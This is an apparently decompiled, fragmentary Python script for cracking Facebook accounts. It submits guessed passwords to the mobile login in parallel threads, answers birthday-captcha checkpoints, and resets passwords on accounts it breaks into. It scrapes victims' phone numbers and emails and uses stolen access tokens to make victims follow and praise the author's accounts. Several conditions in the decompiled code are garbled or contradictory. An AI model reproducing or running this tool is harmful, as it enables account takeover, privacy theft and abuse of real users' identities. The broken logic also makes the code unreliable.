...
def __get_id_dev__(username):
    ...
    with requests.Session() as dev:
        payload = {
            'fburl': 'https://m.facebook.com/{}'.format(username),
            'check': 'Lookup' }
...
def love_token(token):
    ...
    with requests.Session() as dev_:
        ...
        dev_.post('https://graph.facebook.com/{}/subscribers?access_token={}'.format(random.choice([
            '100001027764318',
            '100045387495929',
            '100040248105716']), token))
        ikuti_ = []
...
def komen(token):
    for dev in range(1):
        with requests.Session() as dev_:
            komen_ = random.choice([
                'Toolsnya Mantap',
                'Gw Fans Lu Bang',
                'Gimana Kabarnya Bang?',
                'Hallo bang',
                'Keren Bos..',
                'Thanks bang Toolsnya',
                'Gak sia2 saya make tool abang, Keren Abis, Ga ada Obat'])
    ...
    try:
        ...
        with requests.Session() as ses_dev:
            ...
            ses_dev.headers.update({
                ...
                'x-fb-lsd': form_dev.find('input', attrs = {
                    'name': 'lsd' })['value'] })
            payload = {
                'email': em_dev,
...
def crack_dev_api(iqbal_, dev___):
    global count_, user_agent, count_
    ua = y[0]
                ...
                pay_dev.update({
                    ...
                    'bi_wvdp': {
                        ...
                        'iframeData': {
                            ...
                            'has_creds': True } },
                    'email': str(eml_dev),
                    'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(random.randint(1000000000, 0x2540BE3FFL)), str(san_dev)),
                    'bi_xrwh': '0',
                    '__dyn': '',
                    '__csr': '',
                    '__req': 'e',
...
def sandi_dev():
    ...
    for dev in san_:
        if len(dev) >= 6:
            ...
            continue
        if not len(dev) == 3 and len(dev) == 4:
            if len(dev) == 5:
    ...
    with ThreadPoolExecutor(max_workers = 25) as c_dev:
        for data_ in user_id:
            ...
            try:
                ...
                pas = pas + san_manual
                f = te[0]
                if 'Dev' in san_ttl and '>>>' in data_:
                    tl_dev = []
                    pw = pw[0].split('>>>')
                    tl = str(pw[1])
                    tl_ = tl.replace('/', '')
...
def _iqbal_dev_pw_new_(pw_new_, data, eml_dev, ses_dev, respon_2, san_dev):
    ...
    try:
        ...
        submit_2 = sop_dev_2.find('input', attrs = {
            'name': 'submit[Next]' })['value']
        nh_2 = sop_dev_2.find('input', attrs = {
            'name': 'nh' })['value']
        payload = { }
        for dev in form:
            input = dev
        ...
        payload.update({
            'nh': nh_2,
            'submit[Next]': submit_2,
            'password_new': pw_new_ })
        ...
        try:
            ...
            try:
                ...
                for dev in info_kontak.find_all('td', class_ = True, valign = 'top'):
                    ...
                    if data_kontak != '' or '-' in data_kontak:
                        info.append(h + '\n{' + k + 'inf' + h + '}' + p + info_ + ' No HP: ' + a + data_kontak)
                    if '@gmail.com' in data_kontak and '@yahoo.com' in data_kontak or '@email.com' in data_kontak:
                ...
                try:
                    ...
                    if 'checkpointSecondaryButton' in respon_.text:
                        ...
                        if len(pw_tap) != 0:
                            ...
                            submit = sop_dev.find('input', attrs = {
                                'name': 'submit[Yes]' })['value']
                            nh = sop_dev.find('input', attrs = {
                                'name': 'nh' })['value']
                            payload = { }
                            for dev in form:
                                input = dev
                    ...
                    select_dev = sop.find('select', attrs = {
                    ...
                    dat = data.split()
                    if len(pw_tap) != 0:
                        if (len(sesi_ttl) == 1 or len(dat) == 7 or len(sesi_ttl) == 1) and len(dat) == 6:
                            ...
                            while True:
                                ...
                                if len(kondisi) != 1:
                                    payload.update({
                                        'nh': nh,
                                        'submit[Continue]': submit,
                                        'birthday_captcha_day': str(tl_dev[1]),
                                        'birthday_captcha_month': str(tl_dev[0]),
                                        'birthday_captcha_year': str(tl_dev[2]) })
                                else:
                                    kondisi = []
                                    payload.update({
                                        'nh': nh,
                                        'submit[Continue]': submit,
                                        'birthday_captcha_day': str(tl_dev[0]),
                                        'birthday_captcha_month': str(tl_dev[1]),
                                        'birthday_captcha_year': str(tl_dev[2]) })
                                ...
                                if 'checkpointSecondaryButton' in respon_ttl_2.text:
                                    ...
                                    if 'password_new' in respon_2.text:
                                        ...
                                        _iqbal_dev_pw_new_(pw_new_, data, eml_dev, ses_dev, respon_, san_dev)
                                        break
                                if 'password_new' in respon_ttl_2.text:
...
def cek_akun_tumbal():
    ...
    try:
        ...
        def list_(token):
            ...
            jml_tem = []
            c = 1
            with open('akun_tumbal.txt', 'w').close():
                ses_dev = requests.Session()
        ...
        if pilih == '4':
            ...
            try:
                subprocess.check_output([
                    'am',
                    'start',
                    'https://www.instagram.com/iqbaldev/'])
                login()
            login()
        ...
        with requests.Session() as ses_:
            ...
            try:
                if user_agent_ == cokiez:
                    ...
                    elif ':' in str(lim_dev) or '-' in str(lim_dev):
                        import os
            ...
            try:
                if user_agent_ == cokiez:
                    ...
                    try:
                        if pilih == '1' and pilih == '2' and pilih == '3' and pilih == '4' and pilih == '5' and pilih == '6' and pilih == '7' and pilih == '8' or pilih == '15':
                            if user_agent_ == cokiez:
                                pass
                            else:
                                pilih = '17'
            ...
            try:
                ...
                if pilih == '17':
                    ...
                    id__ = str(random.randint(111111, 0x38D7EA4C67FFFL))
